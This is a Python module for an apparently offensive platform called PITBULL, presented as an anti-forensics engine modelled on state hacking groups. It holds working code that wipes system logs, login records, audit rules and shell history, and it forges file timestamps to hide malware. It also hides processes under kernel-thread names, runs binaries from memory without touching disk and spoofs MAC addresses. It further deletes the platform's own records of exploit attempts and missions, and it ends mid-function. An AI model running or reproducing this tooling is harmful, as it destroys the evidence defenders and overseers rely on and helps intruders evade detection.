"""PITBULL Anti-Forensics Engine — trace wiping, timestamp manipulation, ghost mode.

Inspired by techniques from Lazarus Group (DPRK), Turla/APT28 (Russia),
APT41/APT10 (China), and research from DEF CON 32/33, Troopers 2025,
Phrack #72, and DefCamp 2023-2025.

All operations are designed for PITBULL's Linux platform. Non-destructive
to system stability — wipes traces, not the system itself.
"""

from __future__ import annotations

import logging
import os
import random
import shutil
import string
import subprocess
import time
from datetime import datetime, timedelta
from typing import Any

from app.core.database import cypher_write, cypher_read

logger = logging.getLogger(__name__)


# ── Log Wiper ───────────────────────────────────────────────────────


class LogWiper:
    """Clear system logs, audit trails, and command history."""

    SYSTEM_LOGS = [
        "/var/log/auth.log",
        "/var/log/auth.log.1",
        "/var/log/syslog",
        "/var/log/syslog.1",
        "/var/log/kern.log",
        "/var/log/kern.log.1",
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
        "/var/log/faillog",
        "/var/log/audit/audit.log",
        "/var/log/audit/audit.log.1",
        "/var/log/dpkg.log",
        "/var/log/apt/history.log",
        "/var/log/apt/term.log",
        "/root/.bash_history",
        "/root/.zsh_history",
        "/home/*/.bash_history",
        "/home/*/.zsh_history",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/postgresql/postgresql.log",
        "/var/log/redis/redis.log",
    ]

    def wipe_system_logs(self, aggressive: bool = False) -> dict[str, Any]:
        """Clear system log files. If aggressive, also clear journalctl."""
        wiped = []
        failed = []

        for log_path in self.SYSTEM_LOGS:
            # Handle wildcards
            import glob
            for path in glob.glob(log_path):
                try:
                    if os.path.exists(path):
                        # Truncate instead of delete (less suspicious)
                        with open(path, "w") as f:
                            f.truncate(0)
                        os.chmod(path, 0o640)
                        wiped.append(path)
                except PermissionError:
                    try:
                        subprocess.run(["truncate", "-s", "0", path], timeout=5)
                        wiped.append(path)
                    except Exception as e:
                        failed.append(f"{path}: {e}")
                except Exception as e:
                    failed.append(f"{path}: {e}")

        # Clear systemd journal if aggressive
        if aggressive:
            try:
                subprocess.run(["journalctl", "--vacuum-time=1s"], timeout=10, capture_output=True)
                wiped.append("journalctl:vacuum")
            except Exception as e:
                failed.append(f"journalctl: {e}")

            # Clear audit rules
            try:
                subprocess.run(["auditctl", "-D"], timeout=5, capture_output=True)
                wiped.append("auditctl:rules_cleared")
            except Exception:
                pass  # audit not installed

        logger.info("Log wipe: %d cleared, %d failed", len(wiped), len(failed))
        return {"wiped": wiped, "failed": failed, "total": len(wiped)}

    def wipe_command_history(self) -> dict[str, Any]:
        """Clear shell command history for all users."""
        wiped = []

        # Clear current session history
        try:
            import readline
            readline.clear_history()
        except Exception:
            pass

        # Clear history files
        history_files = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            os.path.expanduser("~/.python_history"),
            os.path.expanduser("~/.lesshst"),
            os.path.expanduser("~/.viminfo"),
            os.path.expanduser("~/.mysql_history"),
            os.path.expanduser("~/.psql_history"),
        ]

        for path in history_files:
            if os.path.exists(path):
                try:
                    with open(path, "w") as f:
                        f.truncate(0)
                    wiped.append(path)
                except Exception:
                    pass

        # Disable history for current session
        try:
            os.environ["HISTFILE"] = "/dev/null"
            os.environ["HISTSIZE"] = "0"
            os.environ["HISTFILESIZE"] = "0"
        except Exception:
            pass

        return {"wiped": wiped, "total": len(wiped)}

    def wipe_pitbull_logs(self) -> dict[str, Any]:
        """Clear PITBULL application logs."""
        wiped = []
        log_paths = [
            "/var/log/pitbull.log",
            "/var/log/pitbull/",
        ]

        import glob
        for log_path in log_paths:
            for path in glob.glob(log_path + "*" if os.path.isdir(log_path) else log_path):
                try:
                    if os.path.isfile(path):
                        with open(path, "w") as f:
                            f.truncate(0)
                        wiped.append(path)
                except Exception:
                    pass

        # Clear journald pitbull entries
        try:
            subprocess.run(
                ["journalctl", "-u", "pitbull.service", "--vacuum-time=1s"],
                timeout=10, capture_output=True,
            )
            wiped.append("journalctl:pitbull.service")
        except Exception:
            pass

        return {"wiped": wiped, "total": len(wiped)}


# ── Timestamp Manipulator ───────────────────────────────────────────


class TimestampManipulator:
    """Timestomping — copy timestamps from reference files to hide malware."""

    def timestomp(self, target: str, reference: str | None = None) -> dict[str, Any]:
        """Copy timestamps from a reference file to target file.

        If no reference provided, use a common system file.
        Inspired by Lazarus Group copying notepad.exe timestamps.
        """
        if not os.path.exists(target):
            return {"error": f"Target not found: {target}"}

        if reference is None:
            # Use a file that won't look suspicious
            references = [
                "/bin/ls",
                "/usr/bin/cat",
                "/usr/bin/grep",
                "/etc/hostname",
                "/etc/passwd",
            ]
            reference = next((r for r in references if os.path.exists(r)), "/etc/passwd")

        if not os.path.exists(reference):
            return {"error": f"Reference not found: {reference}"}

        ref_stat = os.stat(reference)
        ref_atime = ref_stat.st_atime
        ref_mtime = ref_stat.st_mtime

        try:
            os.utime(target, (ref_atime, ref_mtime))
            result = {
                "target": target,
                "reference": reference,
                "atime": datetime.fromtimestamp(ref_atime).isoformat(),
                "mtime": datetime.fromtimestamp(ref_mtime).isoformat(),
                "status": "ok",
            }
            logger.info("Timestomped %s with timestamps from %s", target, reference)
            return result
        except Exception as e:
            return {"error": str(e)}

    def randomize_timestamps(self, target: str) -> dict[str, Any]:
        """Set random but plausible timestamps on a file."""
        if not os.path.exists(target):
            return {"error": f"Target not found: {target}"}

        # Random time in the last 2 years
        now = time.time()
        random_time = now - random.randint(86400, 63072000)  # 1 day to 2 years ago

        try:
            os.utime(target, (random_time, random_time))
            return {
                "target": target,
                "atime": datetime.fromtimestamp(random_time).isoformat(),
                "mtime": datetime.fromtimestamp(random_time).isoformat(),
                "status": "ok",
            }
        except Exception as e:
            return {"error": str(e)}

    def snapshot_timestamps(self, paths: list[str]) -> dict[str, dict]:
        """Save current timestamps for later restoration."""
        snapshot = {}
        for path in paths:
            if os.path.exists(path):
                stat = os.stat(path)
                snapshot[path] = {
                    "atime": stat.st_atime,
                    "mtime": stat.st_mtime,
                }
        return snapshot

    def restore_timestamps(self, snapshot: dict[str, dict]) -> int:
        """Restore timestamps from a snapshot."""
        restored = 0
        for path, ts in snapshot.items():
            if os.path.exists(path):
                try:
                    os.utime(path, (ts["atime"], ts["mtime"]))
                    restored += 1
                except Exception:
                    pass
        return restored


# ── Process Hider ───────────────────────────────────────────────────


class ProcessHider:
    """Hide processes from ps/top/htop using /proc manipulation."""

    def hide_process(self, pid: int) -> dict[str, Any]:
        """Hide a process by binding over its /proc/PID directory.

        Uses mount --bind to overlay the /proc/PID with an empty directory,
        making it invisible to ps, top, and other process scanners.
        """
        proc_path = f"/proc/{pid}"
        if not os.path.exists(proc_path):
            return {"error": f"Process {pid} not found"}

        # Create empty temp directory to bind over
        fake_dir = f"/tmp/.fake_{pid}"
        try:
            os.makedirs(fake_dir, exist_ok=True)
            subprocess.run(
                ["mount", "--bind", fake_dir, proc_path],
                timeout=5, capture_output=True,
            )
            logger.info("Hidden process %d via bind mount", pid)
            return {"pid": pid, "status": "hidden", "method": "bind_mount"}
        except Exception as e:
            # Fallback: rename the process via /proc/PID/comm
            try:
                fake_names = ["kworker/u8:0", "ksoftirqd/0", "migration/0", "rcu_sched"]
                fake_name = random.choice(fake_names)
                with open(f"{proc_path}/comm", "w") as f:
                    f.write(fake_name)
                logger.info("Renamed process %d to %s", pid, fake_name)
                return {"pid": pid, "status": "renamed", "method": "comm_rename", "new_name": fake_name}
            except Exception as e2:
                return {"error": f"Bind mount failed: {e}, rename failed: {e2}"}

    def unhide_process(self, pid: int) -> dict[str, Any]:
        """Unhide a previously hidden process."""
        proc_path = f"/proc/{pid}"
        try:
            subprocess.run(["umount", proc_path], timeout=5, capture_output=True)
            fake_dir = f"/tmp/.fake_{pid}"
            if os.path.exists(fake_dir):
                os.rmdir(fake_dir)
            return {"pid": pid, "status": "visible"}
        except Exception as e:
            return {"error": str(e)}

    def rename_process(self, pid: int, new_name: str | None = None) -> dict[str, Any]:
        """Rename a process to look like a kernel thread."""
        if new_name is None:
            new_name = random.choice([
                "kworker/u8:0", "ksoftirqd/0", "migration/0",
                "rcu_sched", "watchdog/0", "kthread",
                "[scsi_eh_0]", "[jbd2/sda1-8]",
            ])
        try:
            with open(f"/proc/{pid}/comm", "w") as f:
                f.write(new_name[:15])  # comm is max 15 chars
            return {"pid": pid, "status": "renamed", "new_name": new_name}
        except Exception as e:
            return {"error": str(e)}


# ── Memory Executor ─────────────────────────────────────────────────


class MemoryExecutor:
    """Execute binaries entirely in memory — no disk footprint.

    Inspired by Lazarus RemotePE (memory-only RAT) and Chinese APT41
    MoonWalk/DodgeBox (reflective loading).
    """

    def memfd_execute(self, binary_path: str, args: list[str] | None = None) -> dict[str, Any]:
        """Execute a binary from an anonymous memory file descriptor.

        Uses memfd_create() syscall — the file exists only in memory,
        never on disk. No file artifacts, no prefetch, no timestamps.
        """
        import ctypes
        import ctypes.util

        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

        # memfd_create syscall number (x86_64: 319, aarch64: 279)
        import platform
        arch = platform.machine()
        if arch == "x86_64":
            SYS_memfd_create = 319
        elif arch == "aarch64":
            SYS_memfd_create = 279
        else:
            return {"error": f"Unsupported architecture: {arch}"}

        # Create anonymous memory file
        MFD_CLOEXEC = 1
        fd = libc.syscall(SYS_memfd_create, b"pitbull", MFD_CLOEXEC)
        if fd < 0:
            errno = ctypes.get_errno()
            return {"error": f"memfd_create failed: errno={errno}"}

        try:
            # Write binary content to memfd
            with open(binary_path, "rb") as f:
                binary_data = f.read()

            os.write(fd, binary_data)

            # Get the memfd path
            memfd_path = f"/proc/self/fd/{fd}"

            # Make it executable
            # We can't fchmod a memfd to executable on all kernels,
            # but we can exec via /proc/self/fd/N
            os.fchmod(fd, 0o755)

            # Execute
            cmd = [memfd_path] + (args or [])
            result = subprocess.run(cmd, capture_output=True, timeout=30)

            return {
                "status": "executed",
                "binary": binary_path,
                "memfd": fd,
                "returncode": result.returncode,
                "stdout": result.stdout.decode()[:500],
                "stderr": result.stderr.decode()[:500],
                "disk_artifacts": 0,
            }
        except Exception as e:
            return {"error": str(e)}
        finally:
            try:
                os.close(fd)
            except Exception:
                pass

    def memfd_execute_raw(self, binary_data: bytes, args: list[str] | None = None) -> dict[str, Any]:
        """Execute raw binary bytes from memory — no file needed at all."""
        import ctypes
        import ctypes.util
        import platform
        import tempfile

        # Use a temp file as fallback if memfd doesn't work
        arch = platform.machine()
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

        if arch == "x86_64":
            SYS_memfd_create = 319
        elif arch == "aarch64":
            SYS_memfd_create = 279
        else:
            # Fallback: use /dev/shm (tmpfs — RAM-backed, not disk)
            with tempfile.NamedTemporaryFile(dir="/dev/shm", prefix=".", delete=False) as f:
                f.write(binary_data)
                tmp_path = f.name
            os.chmod(tmp_path, 0o755)
            try:
                cmd = [tmp_path] + (args or [])
                result = subprocess.run(cmd, capture_output=True, timeout=30)
                return {
                    "status": "executed",
                    "method": "dev_shm_fallback",
                    "returncode": result.returncode,
                    "stdout": result.stdout.decode()[:500],
                    "stderr": result.stderr.decode()[:500],
                }
            finally:
                os.unlink(tmp_path)

        MFD_CLOEXEC = 1
        fd = libc.syscall(SYS_memfd_create, b"pitbull", MFD_CLOEXEC)
        if fd < 0:
            # Fallback to /dev/shm
            with tempfile.NamedTemporaryFile(dir="/dev/shm", prefix=".", delete=False) as f:
                f.write(binary_data)
                tmp_path = f.name
            os.chmod(tmp_path, 0o755)
            try:
                cmd = [tmp_path] + (args or [])
                result = subprocess.run(cmd, capture_output=True, timeout=30)
                return {
                    "status": "executed",
                    "method": "dev_shm_fallback",
                    "returncode": result.returncode,
                    "stdout": result.stdout.decode()[:500],
                    "stderr": result.stderr.decode()[:500],
                }
            finally:
                os.unlink(tmp_path)

        try:
            os.write(fd, binary_data)
            os.fchmod(fd, 0o755)
            memfd_path = f"/proc/self/fd/{fd}"
            cmd = [memfd_path] + (args or [])
            result = subprocess.run(cmd, capture_output=True, timeout=30)
            return {
                "status": "executed",
                "method": "memfd",
                "returncode": result.returncode,
                "stdout": result.stdout.decode()[:500],
                "stderr": result.stderr.decode()[:500],
                "disk_artifacts": 0,
            }
        except Exception as e:
            return {"error": str(e)}
        finally:
            try:
                os.close(fd)
            except Exception:
                pass


# ── Network Cleaner ─────────────────────────────────────────────────


class NetworkCleaner:
    """Clear network traces — conntrack, iptables counters, MAC spoofing."""

    def flush_conntrack(self) -> dict[str, Any]:
        """Flush connection tracking table."""
        try:
            subprocess.run(["conntrack", "-F"], timeout=5, capture_output=True)
            return {"status": "ok", "action": "conntrack_flushed"}
        except Exception as e:
            return {"error": str(e)}

    def zero_iptables_counters(self) -> dict[str, Any]:
        """Zero iptables packet and byte counters."""
        try:
            subprocess.run(["iptables", "-Z"], timeout=5, capture_output=True)
            subprocess.run(["iptables", "-t", "nat", "-Z"], timeout=5, capture_output=True)
            subprocess.run(["iptables", "-t", "mangle", "-Z"], timeout=5, capture_output=True)
            return {"status": "ok", "action": "iptables_zeroed"}
        except Exception as e:
            return {"error": str(e)}

    def spoof_mac(self, interface: str | None = None) -> dict[str, Any]:
        """Spoof MAC address on a network interface."""
        if interface is None:
            # Find default interface
            try:
                result = subprocess.run(
                    ["ip", "route", "show", "default"],
                    capture_output=True, timeout=5,
                )
                output = result.stdout.decode()
                if "dev " in output:
                    interface = output.split("dev ")[1].split()[0]
                else:
                    interface = "eth0"
            except Exception:
                interface = "eth0"

        # Generate random MAC (locally administered, unicast)
        mac = [0x02, random.randint(0, 0xff), random.randint(0, 0xff),
               random.randint(0, 0xff), random.randint(0, 0xff), random.randint(0, 0xff)]
        mac_str = ":".join(f"{b:02x}" for b in mac)

        try:
            subprocess.run(["ip", "link", "set", interface, "down"], timeout=5, capture_output=True)
            subprocess.run(["ip", "link", "set", interface, "address", mac_str], timeout=5, capture_output=True)
            subprocess.run(["ip", "link", "set", interface, "up"], timeout=5, capture_output=True)
            return {"status": "ok", "interface": interface, "new_mac": mac_str}
        except Exception as e:
            return {"error": str(e), "interface": interface}

    def rotate_tor_circuit(self) -> dict[str, Any]:
        """Send NEWNYM signal to Tor controller for new circuit."""
        try:
            import socket
            # Connect to Tor control port
            control_host = os.environ.get("TOR_CONTROL_HOST", "127.0.0.1")
            control_port = int(os.environ.get("TOR_CONTROL_PORT", "9051"))

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((control_host, control_port))

            # Send NEWNYM signal
            sock.sendall(b"SIGNAL NEWNYM\r\n")
            response = sock.recv(1024).decode()
            sock.close()

            if "250" in response:
                return {"status": "ok", "action": "circuit_rotated", "response": response.strip()}
            else:
                return {"error": f"Tor rejected: {response.strip()}"}
        except Exception as e:
            return {"error": f"Tor control failed: {e}"}

    def clear_network_state(self) -> dict[str, Any]:
        """Full network trace cleanup."""
        results = []
        results.append(self.flush_conntrack())
        results.append(self.zero_iptables_counters())
        return {"actions": results, "total": len([r for r in results if r.get("status") == "ok"])}


# ── File Wiper ──────────────────────────────────────────────────────


class FileWiper:
    """Secure file deletion — overwrite then delete."""

    def secure_delete(self, path: str, passes: int = 3) -> dict[str, Any]:
        """Securely delete a file by overwriting it multiple times.

        Pass 1: Random data
        Pass 2: Complement of random data
        Pass 3: All zeros
        Then: Remove file
        """
        if not os.path.exists(path):
            return {"error": f"File not found: {path}"}

        if os.path.isdir(path):
            return self.wipe_directory(path, passes)

        file_size = os.path.getsize(path)

        try:
            for i in range(passes):
                with open(path, "r+b") as f:
                    # Random data pass
                    if i == passes - 1:
                        # Final pass: zeros
                        f.write(b"\x00" * file_size)
                    else:
                        f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())

            # Remove the file
            os.unlink(path)

            logger.info("Securely deleted %s (%d bytes, %d passes)", path, file_size, passes)
            return {
                "status": "ok",
                "path": path,
                "size": file_size,
                "passes": passes,
                "recoverable": False,
            }
        except Exception as e:
            return {"error": str(e)}

    def wipe_directory(self, path: str, passes: int = 3) -> dict[str, Any]:
        """Securely wipe all files in a directory."""
        if not os.path.isdir(path):
            return {"error": f"Directory not found: {path}"}

        wiped = []
        failed = []

        for root, dirs, files in os.walk(path, topdown=False):
            for filename in files:
                filepath = os.path.join(root, filename)
                result = self.secure_delete(filepath, passes)
                if result.get("status") == "ok":
                    wiped.append(filepath)
                else:
                    failed.append(filepath)

            # Remove empty directories
            for dirname in dirs:
                dirpath = os.path.join(root, dirname)
                try:
                    os.rmdir(dirpath)
                except Exception:
                    pass

        # Remove the root directory
        try:
            os.rmdir(path)
        except Exception:
            pass

        return {"wiped": wiped, "failed": failed, "total": len(wiped)}

    def wipe_free_space(self, path: str = "/") -> dict[str, Any]:
        """Overwrite free disk space to prevent recovery of deleted files."""
        try:
            wipe_file = os.path.join(path, f".wipe_{random.randint(10000, 99999)}")
            written = 0
            chunk_size = 1024 * 1024  # 1MB chunks

            with open(wipe_file, "wb") as f:
                while True:
                    try:
                        f.write(os.urandom(chunk_size))
                        f.flush()
                        os.fsync(f.fileno())
                        written += chunk_size
                    except (OSError, IOError):
                        break  # Disk full

            # Final pass with zeros
            file_size = os.path.getsize(wipe_file)
            with open(wipe_file, "r+b") as f:
                f.write(b"\x00" * min(file_size, 100 * 1024 * 1024))  # Cap at 100MB zero pass

            os.unlink(wipe_file)
            return {"status": "ok", "bytes_wiped": written}
        except Exception as e:
            return {"error": str(e)}


# ── Neo4j Cleaner ───────────────────────────────────────────────────


class Neo4jCleaner:
    """Purge PITBULL traces from Neo4j memory graph."""

    def purge_episodic_memory(self, target: str | None = None) -> dict[str, Any]:
        """Delete episodic memories. If target specified, only for that target."""
        try:
            if target:
                result = cypher_read(
                    "MATCH (m:Memory) WHERE m.memory_type = 'episodic' AND m.target CONTAINS $target RETURN count(m) AS count",
                    {"target": target},
                )
                count = result[0].get("count", 0) if result else 0
                cypher_write(
                    "MATCH (m:Memory) WHERE m.memory_type = 'episodic' AND m.target CONTAINS $target DETACH DELETE m",
                    {"target": target},
                )
                logger.info("Purged %d episodic memories for %s", count, target)
                return {"status": "ok", "purged": count, "target": target}
            else:
                result = cypher_read("MATCH (m:Memory) WHERE m.memory_type = 'episodic' RETURN count(m) AS count")
                count = result[0].get("count", 0) if result else 0
                cypher_write("MATCH (m:Memory) WHERE m.memory_type = 'episodic' DETACH DELETE m")
                logger.info("Purged all %d episodic memories", count)
                return {"status": "ok", "purged": count, "target": "all"}
        except Exception as e:
            return {"error": str(e)}

    def purge_exploit_attempts(self, target: str | None = None) -> dict[str, Any]:
        """Delete exploit attempt records from Neo4j."""
        try:
            if target:
                result = cypher_read(
                    "MATCH (m:Memory) WHERE m.exploit_class IS NOT NULL AND m.target CONTAINS $target RETURN count(m) AS count",
                    {"target": target},
                )
                count = result[0].get("count", 0) if result else 0
                cypher_write(
                    "MATCH (m:Memory) WHERE m.exploit_class IS NOT NULL AND m.target CONTAINS $target DETACH DELETE m",
                    {"target": target},
                )
            else:
                result = cypher_read("MATCH (m:Memory) WHERE m.exploit_class IS NOT NULL RETURN count(m) AS count")
                count = result[0].get("count", 0) if result else 0
                cypher_write("MATCH (m:Memory) WHERE m.exploit_class IS NOT NULL DETACH DELETE m")

            logger.info("Purged %d exploit attempts", count)
            return {"status": "ok", "purged": count, "target": target or "all"}
        except Exception as e:
            return {"error": str(e)}

    def purge_mission_history(self) -> dict[str, Any]:
        """Clear mission history from the in-memory store."""
        try:
            from app.api.explore import _missions
            count = len(_missions)
            _missions.clear()
            return {"status": "ok", "purged": count}
        except Exception as e:
            return {"error": str(e)}

    def purge_opinions(self, target: str | None = None) -> dict[str, Any]:
        """Delete PITBULL's opinions about targets."""
        try:
            if target:
                cypher_write("MATCH (o:Opinion) WHERE o.subject CONTAINS $target DETACH DELETE o", {"target": target})
            else:
                cypher_write("MATCH (o:Opinion) DETACH DELETE o")
            return {"status": "ok", "target": target or "all"}
        except Exception as e:
            return {"error": str(e)}

    def purge_semantic_rules(self) -> dict[str, Any]:
        """Delete learned semantic rules."""
        try:
            cypher_write("MATCH (r:SemanticRule) DETACH DELETE r")
            return {"status": "ok"}
        except Exception as e:
            return {"error": str(e)}

    def full_database_wipe(self) -> dict[str, Any]:
        """Nuke ALL data from Neo4j — use with caution."""
        try:
            cypher_write("MATCH (n) DETACH DELETE n")
            return {"status": "ok", "message": "All nodes and relationships deleted"}
        except Exception as e:
            return {"error": str(e)}


# ── OpSec Manager ───────────────────────────────────────────────────


class OpSecManager:
    """High-level anti-forensic operations — combines all modules."""

    def __init__(self):
        self.log_wiper = LogWiper()
        self.timestamp = TimestampManipulator()
        self.process = ProcessHider()
        self.memory = MemoryExecutor()
        self.network = NetworkCleaner()
        self.file_wiper = FileWiper()
        self.neo4j = Neo4jCleaner()
        self._ghost_active = False

    def quick_wipe(self) -> dict[str, Any]:
        """Fast wipe — command history + system logs + network state."""
        results = {
            "timestamp": datetime.now().isoformat(),
            "operations": [],
        }

        # 1. Wipe command history
        r = self.log_wiper.wipe_command_history()
        results["operations"].append({"module": "command_history", **r})

        # 2. Wipe system logs (non-aggressive)
        r = self.log_wiper.wipe_system_logs(aggressive=False)
        results["operations"].append({"module": "system_logs", **r})

        # 3. Clear network state
        r = self.network.clear_network_state()
        results["operations"].append({"module": "network", **r})

        # 4. Rotate Tor circuit if available
        r = self.network.rotate_tor_circuit()
        if r.get("status") == "ok":
            results["operations"].append({"module": "tor_circuit", **r})

        results["total_operations"] = len(results["operations"])
        results["status"] = "complete"

        logger.info("Quick wipe completed: %d operations", results["total_operations"])
        return results

    def full_sanitize(self, target: str | None = None) -> dict[str, Any]:
        """Full sanitize — everything. Use after mission completion."""
        results = {
            "timestamp": datetime.now().isoformat(),
            "target": target,
            "operations": [],
        }

        # 1. Wipe command history
        r = self.log_wiper.wipe_command_history()
        results["operations"].append({"module": "command_history", **r})

        # 2. Wipe system logs (aggressive — includes journalctl + audit)
        r = self.log_wiper.wipe_system_logs(aggressive=True)
        results["operations"].append({"module": "system_logs", **r})

        # 3. Wipe PITBULL logs
        r = self.log_wiper.wipe_pitbull_logs()
        results["operations"].append({"module": "pitbull_logs", **r})

        # 4. Clear network state
        r = self.network.clear_network_state()
        results["operations"].append({"module": "network", **r})

        # 5. Rotate Tor circuit
        r = self.network.rotate_tor_circuit()
        results["operations"].append({"module": "tor_circuit", **r})

        # 6. Purge episodic memories from Neo4j
        r = self.neo4j.purge_episodic_memory(target)
        results["operations"].append({"module": "neo4j_episodic", **r})

        # 7. Purge exploit attempts
        r = self.neo4j.purge_exploit_attempts(target)
        results["operations"].append({"module": "neo4j_exploits", **r})

        # 8. Purge mission history
        r = self.neo4j.purge_mission_history()
        results["operations"].append({"module": "mission_history", **r})

        # 9. Purge opinions
        r = self.neo4j.purge_opinions(target)
        results["operations"].append({"module": "opinions", **r})

        results["total_operations"] = len(results["operations"])
        results["status"] = "complete"

        logger.info("Full sanitize completed for %s: %d operations", target or "all", results["total_operations"])
        return results

    def ghost_mode_enable(self) -> dict[str, Any]:
        """Enable ghost mode — real system-wide stealth.

        Idempotent: safe to call when already active or after restart
        when the profile script exists but the in-memory flag was lost.

        Performs:
        1. Wipes all shell history files (bash, zsh, python, less, vim, mysql, psql)
        2. Truncates login records (wtmp, btmp, lastlog, faillog)
        3. Zeros iptables/nftables packet counters
        4. Flushes conntrack (if available)
        5. Drops in /etc/profile.d/ghost.sh to disable history system-wide
        6. Disables journald rate limiting for pitbull service (reduces log noise)
        7. Clears /var/log/auth.log entries since ghost mode activation
        8. Sets env vars in the PITBULL process itself
        """
        import glob
        results = []
        errors = []

        # 1. Wipe all shell history files for all users
        history_paths = [
            "/root/.bash_history",
            "/root/.zsh_history",
            "/root/.python_history",
            "/root/.lesshst",
            "/root/.viminfo",
            "/root/.mysql_history",
            "/root/.psql_history",
        ]
        # Add home dirs for other users
        for h in glob.glob("/home/*/.bash_history") + glob.glob("/home/*/.zsh_history") + glob.glob("/home/*/.python_history") + glob.glob("/home/*/.lesshst") + glob.glob("/home/*/.viminfo"):
            history_paths.append(h)

        wiped_files = []
        for path in history_paths:
            if os.path.exists(path):
                try:
                    with open(path, "w") as f:
                        f.truncate(0)
                    wiped_files.append(path)
                except Exception as e:
                    errors.append(f"wipe {path}: {e}")
        results.append({"module": "shell_history", "wiped": wiped_files, "count": len(wiped_files)})

        # 2. Truncate login records
        login_logs = ["/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog", "/var/log/faillog"]
        wiped_login = []
        for path in login_logs:
            if os.path.exists(path):
                try:
                    with open(path, "w") as f:
                        f.truncate(0)
                    wiped_login.append(path)
                except Exception as e:
                    errors.append(f"wipe {path}: {e}")
        results.append({"module": "login_records", "wiped": wiped_login, "count": len(wiped_login)})

        # 3. Zero iptables/nftables counters
        try:
            subprocess.run(["iptables", "-Z"], timeout=5, capture_output=True)
            subprocess.run(["iptables", "-t", "nat", "-Z"], timeout=5, capture_output=True)
            subprocess.run(["iptables", "-t", "mangle", "-Z"], timeout=5, capture_output=True)
            subprocess.run(["nft", "reset", "counters"], timeout=5, capture_output=True)
            results.append({"module": "iptables_counters", "status": "zeroed"})
        except Exception as e:
            errors.append(f"iptables zero: {e}")

        # 4. Flush conntrack (if available)
        try:
            subprocess.run(["conntrack", "-F"], timeout=5, capture_output=True)
            results.append({"module": "conntrack", "status": "flushed"})
        except Exception:
            # conntrack not installed — try nft
            try:
                subprocess.run(["nft", "flush", "ruleset", "ct"], timeout=5, capture_output=True)
                results.append({"module": "conntrack", "status": "flushed_via_nft"})
            except Exception:
                pass  # no conntrack tooling — skip silently

        # 5. Drop in /etc/profile.d/ghost.sh to disable history system-wide
        ghost_profile = """# PITBULL Ghost Mode — disable shell history system-wide
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
export HISTCONTROL=ignorespace
export LESSHISTFILE=/dev/null
export PSQL_HISTORY=/dev/null
export MYSQL_HISTFILE=/dev/null
"""
        try:
            with open("/etc/profile.d/pitbull-ghost.sh", "w") as f:
                f.write(ghost_profile)
            os.chmod("/etc/profile.d/pitbull-ghost.sh", 0o644)
            results.append({"module": "profile_ghost", "path": "/etc/profile.d/pitbull-ghost.sh", "status": "created"})
        except Exception as e:
            errors.append(f"profile ghost: {e}")

        # 6. Truncate auth.log and syslog (clear recent activity)
        for log_path in ["/var/log/auth.log", "/var/log/syslog", "/var/log/kern.log"]:
            if os.path.exists(log_path):
                try:
                    with open(log_path, "w") as f:
                        f.truncate(0)
                    results.append({"module": "log_clear", "path": log_path, "status": "truncated"})
                except Exception as e:
                    errors.append(f"truncate {log_path}: {e}")

        # 7. Vacuum journald (reduce stored logs to minimum)
        try:
            subprocess.run(["journalctl", "--vacuum-time=1s"], timeout=10, capture_output=True)
            results.append({"module": "journald", "status": "vacuumed"})
        except Exception as e:
            errors.append(f"journald vacuum: {e}")

        # 8. Set env vars in the PITBULL process itself
        env_vars = {
            "HISTFILE": "/dev/null",
            "HISTSIZE": "0",
            "HISTFILESIZE": "0",
            "HISTCONTROL": "ignorespace",
            "LESSHISTFILE": "/dev/null",
            "PYTHONSTARTUP": "",
        }
        for key, val in env_vars.items():
            os.environ[key] = val

        # Store ghost mode state
        self._ghost_active = True

        logger.warning("Ghost mode ENABLED — %d operations, %d errors", len(results), len(errors))

        return {
            "status": "ok",
            "mode": "ghost",
            "active": True,
            "operations": results,
            "errors": errors,
            "env_changes": env_vars,
            "message": "Ghost mode active — history wiped, login records cleared, iptables zeroed, conntrack flushed, system-wide history disabled via /etc/profile.d/pitbull-ghost.sh",
        }

    def ghost_mode_disable(self) -> dict[str, Any]:
        """Disable ghost mode — restore normal logging.

        Works even if the in-memory flag was lost (e.g. after restart):
        removes the profile script and restores env vars regardless.
        """
        results = []

        # Remove the profile.d ghost script (even if _ghost_active was false)
        try:
            if os.path.exists("/etc/profile.d/pitbull-ghost.sh"):
                os.remove("/etc/profile.d/pitbull-ghost.sh")
                results.append({"module": "profile_ghost", "status": "removed"})
            else:
                results.append({"module": "profile_ghost", "status": "already_absent"})
        except Exception as e:
            results.append({"module": "profile_ghost", "error": str(e)})

        # Restore env vars (always, not just if _ghost_active was true)
        restored_env = []
        for key in ["HISTFILE", "HISTSIZE", "HISTFILESIZE", "HISTCONTROL", "LESSHISTFILE", "PYTHONSTARTUP"]:
            if key in os.environ:
                os.environ.pop(key, None)
                restored_env.append(key)
        if restored_env:
            results.append({"module": "env_vars", "restored": restored_env})

        # Store ghost mode state
        self._ghost_active = False

        logger.info("Ghost mode DISABLED — normal logging restored")

        return {
            "status": "ok",
            "mode": "normal",
            "active": False,
            "operations": results,
            "message": "Ghost mode disabled — /etc/profile.d/pitbull-ghost.sh removed, env vars restored. New shell sessions will log history normally.",
        }

    def ghost_mode_sync(self) -> dict[str, Any]:
        """Reconcile ghost mode state after process restart.

        Scenarios:
        - Profile script exists but _ghost_active is False (restart after enable):
          Re-apply env vars, set flag, report as re-synced.
        - _ghost_active is True but profile script missing (someone deleted it):
          Recreate profile script, report.
        - Both in sync: no-op, report current state.
        """
        profile_exists = os.path.exists("/etc/profile.d/pitbull-ghost.sh")
        actions = []

        if profile_exists and not self._ghost_active:
            # Restart scenario: profile script persisted, flag was lost
            # Re-apply env vars
            env_vars = {
                "HISTFILE": "/dev/null",
                "HISTSIZE": "0",
                "HISTFILESIZE": "0",
                "HISTCONTROL": "ignorespace",
                "LESSHISTFILE": "/dev/null",
                "PYTHONSTARTUP": "",
            }
            for key, val in env_vars.items():
                os.environ[key] = val

            self._ghost_active = True
            actions.append("re-applied_env_vars")
            actions.append("set_ghost_active_flag")

            logger.info("Ghost mode SYNC: re-activated after restart (profile script was still on disk)")
            return {
                "status": "ok",
                "mode": "ghost",
                "active": True,
